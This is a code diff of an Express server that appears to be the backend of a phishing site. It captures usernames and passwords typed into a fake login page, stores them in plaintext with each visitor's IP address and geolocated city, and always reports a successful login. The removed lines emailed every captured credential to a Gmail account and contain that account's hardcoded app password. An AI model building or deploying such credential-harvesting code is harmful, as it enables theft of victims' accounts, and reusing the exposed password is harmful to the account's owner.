@@ -1,7 +1,7 @@
 const express = require('express');
 const path = require('path');
 const sqlite3 = require('sqlite3').verbose();
-const nodemailer = require('nodemailer');
+const fetch = require('node-fetch');
 
 const app = express();
 app.use(express.json());
@@ -15,58 +15,47 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     username TEXT,
     password TEXT,
     ip TEXT,
+    location TEXT,
     timestamp TEXT
 )`);
 
-// Email Setup
-const transporter = nodemailer.createTransport({
-    service: 'gmail',
-    auth: {
-        user: 'alightsmartacc@gmail.com',
-        pass: 'qyzluoldeamjyjqo'   // Your App Password
-    }
-});
-
-function saveRecord(type, username = null, password = null, ip = 'Unknown') {
-    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    
-    db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
-        [type, username, password, ip, timestamp]);
-
-    // Send Email
-    const mailOptions = {
-        from: 'alightsmartacc@gmail.com',
-        to: 'alightsmartacc@gmail.com',
-        subject: `New ${type} - AlightSmart`,
-        html: `
-            <h3>New Activity</h3>
-            <p><strong>Type:</strong> ${type}</p>
-            <p><strong>Username:</strong> ${username || '-'}</p>
-            <p><strong>Password:</strong> ${password || '-'}</p>
-            <p><strong>IP:</strong> ${ip}</p>
-            <p><strong>Time:</strong> ${timestamp}</p>
-            <hr>
-            <p><a href="https://alightsmartacc.onrender.com/admin">Open Admin Dashboard</a></p>
-        `
-    };
-
-    transporter.sendMail(mailOptions).catch(err => console.log('Email failed:', err));
+async function getLocation(ip) {
+    if (!ip || ip === 'Unknown') return 'Unknown';
+    try {
+        const res = await fetch(`https://ipapi.co/${ip}/json/`);
+        const data = await res.json();
+        if (data && data.country_name) {
+            return `${data.city || ''}, ${data.region || ''}, ${data.country_name}`;
+        }
+    } catch (e) {}
+    return 'Unknown Location';
 }
 
-// Routes
-app.get('/', (req, res) => {
-    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+async function saveRecord(type, username = null, password = null, ip = 'Unknown') {
+    const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
+    const location = await getLocation(ip);
+
+    db.run("INSERT INTO records (type, username, password, ip, location, timestamp) VALUES (?, ?, ?, ?, ?, ?)",
+        [type, username, password, ip, location, timestamp]);
+}
+
+// Record every click on your link
+app.get('/', async (req, res) => {
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    await saveRecord('Page Visit', null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-app.get('/login.html', (req, res) => {
-    saveRecord('Page Visit', null, null, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+app.get('/login.html', async (req, res) => {
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    await saveRecord('Page Visit', null, null, ip);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
-app.post('/api/login', (req, res) => {
+app.post('/api/login', async (req, res) => {
     const { username, password } = req.body;
-    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for'] || 'Unknown');
+    const ip = req.ip || req.headers['x-forwarded-for'] || 'Unknown';
+    await saveRecord('Login Attempt', username, password, ip);
     res.json({ success: true });
 });
 
@@ -87,5 +76,5 @@ app.post('/api/clear', (req, res) => {
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`🚀 Server running with Email Notification`);
+    console.log(`🚀 Server running`);
 });
